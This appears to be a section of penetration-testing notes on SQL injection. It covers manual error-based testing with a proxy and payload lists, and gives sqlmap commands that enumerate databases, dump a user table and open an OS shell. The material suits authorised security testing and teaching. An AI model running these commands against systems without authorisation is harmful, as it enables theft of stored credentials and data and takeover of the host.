## 5. SQL injection

### 5.1. Error based SQL injection

- **Actions**:
  - 1. Use a proxy for interception
  - 2. Use intruder with a preset payload for the sql injection (load txt payload list)
  - 3. The length column tells you the extension of the response. Look for anomalies.

### 5.2. sqlmap

- Install → ```apt install sqlmap```
- **Examples**
  - Error based (manual) → ```sqlmap -u (url) --data "parameter=" -p parameter --method POST```
  - Error based (using request file) → ```sqlmap -r request -p words_exact --technique=E```
  - Error based with current db → ```sqlmap -r request -p words_exact --technique=E --current-db```
  - Error based show tables for db → ```sqlmap -r request -p words_exact --technique=E -D recipes --tables```
  - Error based dump table content → ```sqlmap -r request -p words_exact --technique=E -D recipes -T user --dump```
  - Error based (using OS shell) → ```sqlmap -r request -p words_exact --technique=E --os-shell```
- Use sqlmap outputs in proxies to execute the exploit
- Payloads: https://github.com/swisskyrepo/payloadsallthethings
